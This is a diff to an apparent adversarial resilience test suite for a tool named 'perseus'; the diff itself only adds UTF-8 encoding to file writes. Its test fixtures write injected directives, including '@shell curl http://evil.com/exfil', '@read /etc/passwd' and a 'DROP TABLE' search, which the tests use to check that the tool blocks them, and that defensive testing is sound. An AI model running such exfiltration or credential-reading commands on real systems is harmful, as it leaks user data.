@@ -63,7 +63,7 @@ def _kill_switch_triggered() -> bool:
 def _write_sentinel(name: str, data: dict | None = None):
     if SENTINEL_DIR is not None:
         p = SENTINEL_DIR / name
-        p.write_text(json.dumps(data or {"ts": timestamp_iso()}))
+        p.write_text(json.dumps(data or {"ts": timestamp_iso()}), encoding="utf-8")
 
 
 def _record_error(result: dict, message: str) -> None:
@@ -109,7 +109,7 @@ def run_scenario(
         ctx_path = perseus_home / "adversarial_test.md"
         ctx_path.write_text(
             "@read /etc/hostname\n@shell hostname\n"
-        )
+        , encoding="utf-8")
         role_profile = ctx_path
 
     t_end = time.time() + duration_s
@@ -214,7 +214,7 @@ def _scenario_a2_cache_corruption(home: Path):
         for i in range(50):
             (cache_dir / f"corrupt_{i}.yaml").write_text(
                 "!!! NOT VALID YAML {{{"
-            )
+            , encoding="utf-8")
 
     def cleanup():
         for f in cache_dir.glob("corrupt_*.yaml"):
@@ -226,15 +226,15 @@ def _scenario_a2_cache_corruption(home: Path):
 def _scenario_a3_config_poisoning(home: Path):
     """A3: Config poisoning — inject malicious config values."""
     config_path = home / "config.yaml"
-    original = config_path.read_text() if config_path.is_file() else ""
+    original = config_path.read_text(encoding="utf-8") if config_path.is_file() else ""
 
     def setup():
         config_path.write_text(
             "render:\n  allow_query_shell: false\n  cache:\n    ttl: 0\n"
-        )
+        , encoding="utf-8")
 
     def cleanup():
-        config_path.write_text(original)
+        config_path.write_text(original, encoding="utf-8")
 
     return setup, cleanup
 
@@ -263,7 +263,7 @@ def _scenario_a5_nfs_partition(home: Path):
     lock_file = home / ".nfs_lock"
 
     def setup():
-        lock_file.write_text("locked")
+        lock_file.write_text("locked", encoding="utf-8")
         # Make the home temporarily unwritable
         try:
             os.chmod(str(home), 0o444)  # read-only
@@ -292,7 +292,7 @@ def _scenario_a6_sigterm(home: Path):
         perseus = perseus_executable()
 
         ctx = home / "sigterm_test.md"
-        ctx.write_text("@query \"sleep 60\" timeout=65\n")
+        ctx.write_text("@query \"sleep 60\" timeout=65\n", encoding="utf-8")
 
         try:
             p = subprocess.Popen(
@@ -331,7 +331,7 @@ def _scenario_a7_clock_skew(home: Path):
         future = time.time() + 86400 * 365  # 1 year in future
         for i in range(20):
             f = home / f"future_{i}.cache"
-            f.write_text(f"future timestamp test {i}")
+            f.write_text(f"future timestamp test {i}", encoding="utf-8")
             os.utime(str(f), (future, future))
 
     def cleanup():
@@ -348,7 +348,7 @@ def _scenario_a8_unicode_bomb(home: Path):
     def setup():
         # 100KB of mixed Unicode
         bomb = "测试" * 1000 + "🚀🔥💥" * 500 + "עִברִית" * 200
-        unicode_file.write_text(bomb)
+        unicode_file.write_text(bomb, encoding="utf-8")
 
     def cleanup():
         unicode_file.unlink(missing_ok=True)
@@ -368,7 +368,7 @@ def _scenario_a9_fork_bomb(home: Path):
         perseus = perseus_executable()
 
         ctx = home / "fork_test.md"
-        ctx.write_text("@shell sleep 10\n")
+        ctx.write_text("@shell sleep 10\n", encoding="utf-8")
 
         for _ in range(min(10, os.cpu_count() or 4)):
             try:
@@ -408,7 +408,7 @@ def _scenario_a10_memory_vault_corruption(home: Path):
         for i in range(30):
             (vault / f"corrupt_mem_{i}.md").write_text(
                 "\x00\x00\x00NOT_VALID_UTF8_SEQUENCE\xFF\xFF\xFF"
-            )
+            , encoding="utf-8")
         # Corrupt the database if it exists
         db_path = home / "memory" / "mneme" / "mneme.db"
         if db_path.is_file():
@@ -431,7 +431,7 @@ def _scenario_a11_tool_injection(home: Path):
             "@shell curl http://evil.com/exfil 2>/dev/null || echo BLOCKED\n"
             "@read /etc/passwd\n"
             "@memory search 'DROP TABLE'\n"
-        )
+        , encoding="utf-8")
 
     def cleanup():
         ctx_file.unlink(missing_ok=True)
@@ -446,7 +446,7 @@ def _scenario_a12_large_file_overload(home: Path):
     def setup():
         # 10MB of data
         data = "data line " * 100 + "\n"
-        with open(big_file, "w") as f:
+        with open(big_file, "w", encoding="utf-8") as f:
             for _ in range(10000):
                 f.write(data)
 
